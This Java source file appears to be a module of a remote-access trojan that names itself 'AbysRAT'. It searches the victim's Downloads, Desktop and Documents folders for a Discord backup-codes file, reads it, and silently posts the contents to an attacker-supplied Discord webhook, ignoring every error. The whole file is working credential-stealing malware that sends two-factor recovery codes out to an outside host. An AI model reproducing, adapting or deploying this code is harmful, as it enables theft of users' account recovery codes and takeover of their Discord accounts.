package dev.nfo.handlers;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class BackupCodes {
    private String webhookUrl;

    public BackupCodes(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    public void searchAndSend() {
        try {
            String content = searchForBackupCodes();
            if (content != null && !content.isEmpty()) {
                sendEmbed(content);
            }
        } catch (Exception e) {
        }
    }

    private String searchForBackupCodes() {
        String fileName = "discord_backup_codes.txt";
        List<File> searchDirs = new ArrayList<>();
        
        String userHome = System.getProperty("user.home");
        
        searchDirs.add(new File(userHome, "Downloads"));
        searchDirs.add(new File(userHome, "Desktop"));
        searchDirs.add(new File(userHome, "Documents"));
        
        for (File dir : searchDirs) {
            File file = new File(dir, fileName);
            if (file.exists() && file.isFile()) {
                try {
                    StringBuilder content = new StringBuilder();
                    try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                        String line;
                        while ((line = reader.readLine()) != null) {
                            content.append(line).append("\n");
                        }
                    }
                    return content.toString();
                } catch (IOException e) {
                }
            }
        }
        
        return null;
    }

    private void sendEmbed(String content) {
        try {
            String embedJson = buildEmbedJson(content);
            sendWebhook(embedJson);
        } catch (Exception e) {
            // Ignore errors
        }
    }

    private String buildEmbedJson(String content) {
        int color = new Random().nextInt(0xFFFFFF);
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
        String timestamp = sdf.format(new Date());
        
        return "{" +
            "\"username\":\"AbysRAT\"," +
            "\"avatar_url\":\"https://i.imgur.com/ovwcNwY.png\"," +
            "\"embeds\":[{" +
            "\"title\":\"Discord Backup Codes\"," +
            "\"color\":" + color + "," +
            "\"description\":\"```\\n" + escapeJson(content) + "\\n```\"," +
            "\"footer\":{\"text\":\"Abys Private Edition\"}," +
            "\"timestamp\":\"" + timestamp + "\"" +
            "}]" +
            "}";
    }

    private String escapeJson(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
            .replace("`", "\\`");
    }

    private void sendWebhook(String json) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("User-Agent", "AbysRAT/1.0");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            try (OutputStream outputStream = connection.getOutputStream()) {
                byte[] jsonBytes = json.getBytes(StandardCharsets.UTF_8);
                outputStream.write(jsonBytes);
                outputStream.flush();
            }
            
            connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {
            // Ignore errors
        }
    }
}
